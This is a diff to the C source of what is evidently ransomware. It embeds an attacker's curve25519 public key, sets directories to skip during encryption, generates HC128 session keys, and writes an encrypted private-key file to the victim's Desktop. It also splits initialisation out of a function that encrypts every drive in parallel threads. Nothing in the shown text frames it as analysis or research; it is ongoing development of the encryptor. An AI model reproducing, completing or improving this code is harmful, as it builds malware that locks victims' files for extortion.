@@ -11,10 +11,9 @@
 #include "crc32.h"
 
 /* Public key to encrypt private key with. */
-static const BYTE PUBLIC_KEY[32] = { 0x4f, 0xb4, 0x2c, 0xff, 0x34, 0x5f, 0x8f,
+static BYTE g_PUBLIC_KEY[] = { 0x4f, 0xb4, 0x2c, 0xff, 0x34, 0x5f, 0x8f,
     0x7f, 0xe9, 0xdd, 0xe0, 0xec, 0x48, 0x17, 0x6c, 0x01, 0x0c, 0x33, 0x5d,
-    0x43, 0x17, 0x58, 0x85, 0x61, 0x58, 0xba, 0x77, 0xb6, 0xb7, 0x2b, 0x82,
-    0x7e };
+    0x43, 0x17, 0x58, 0x85, 0x61, 0x58, 0xba, 0x77, 0xb6, 0xb7, 0x2b, 0x82, 0x7e };
 
 /* Directories that should not be encrypted. */
 static const wchar_t* IGNORE_DIRECTORIES[] = { L".", L"..", L"$windows.~bt",
@@ -44,6 +43,11 @@ static DWORD WINAPI driveThread(LPVOID lpParam);
 static void iterateDirectory(const wchar_t* path);
 static inline void encryptFile(HANDLE hFile);
 static inline BOOL generateAndStoreKeys();
+
+wchar_t* getPublicKey()
+{
+    return g_publicKey;
+}
 
 BOOL mountVolumes()
 {
@@ -166,7 +170,7 @@ BOOL generateAndStoreKeys()
     curve25519(mt.curve25519Public, session.curve25519Private, BASEPOINT);
     sstrcpy(g_publicKey, sizeof(g_publicKey), mt.curve25519Public);
     // Generate a shared secret
-    curve25519(session.curve25519Shared, session.curve25519Private, PUBLIC_KEY);
+    curve25519(session.curve25519Shared, session.curve25519Private, g_PUBLIC_KEY);
     
     // Initialize the Key & IV for the HC128 algorithm
     SHA512_Simple(session.curve25519Shared, sizeof(session.curve25519Shared), &keys);
@@ -185,7 +189,8 @@ BOOL generateAndStoreKeys()
     ECRYPT_process_bytes(0, &ctx, buffer, buffer, size);
     
     // Write the private key
-    wchar_t* filePath = getDesktopPath();
+#ifndef DEBUG
+    wchar_t* filePath = getSpecialDirectory(&FOLDERID_Desktop);
     if (!filePath)
         return FALSE;
     lstrcatW(filePath, L"\\");
@@ -199,34 +204,39 @@ BOOL generateAndStoreKeys()
     }
     
     DWORD dwWrite;
-    if (!WriteFile(hFile, buffer, size, &dwWrite, NULL))   // Write encrypted data
+    if (!WriteFile(hFile, buffer, size, &dwWrite, NULL))        // Write encrypted data
         goto cleanup;
-    if (!WriteFile(hFile, &mt, sizeof(mt), &dwWrite, NULL))  // Write metadata
+    if (!WriteFile(hFile, &mt, sizeof(mt), &dwWrite, NULL))     // Write metadata
         goto cleanup;
     
 cleanup:
     memset(&session, 0, sizeof(Session_t));
     CloseHandle(hFile);
     sfree(filePath);
+#endif
     
     return TRUE;
 }
 
-BOOL encryptDrives()
+BOOL preEncryptionInitialization()
 {
-    // Initialize global variables
     g_currentPID = GetCurrentProcessId();
     if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
         !CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
         return FALSE;
-    
+
     // Generate global public-private keys
     if (!generateAndStoreKeys())
     {
         CryptReleaseContext(g_hCryptProv, 0);
         return FALSE;
     }
-    
+
+    return TRUE;
+}
+
+BOOL encryptDrives()
+{
     DWORD processorsCount = getSystemInfo().dwNumberOfProcessors;
     dbgmsg("%lu processors found\n", processorsCount);
     
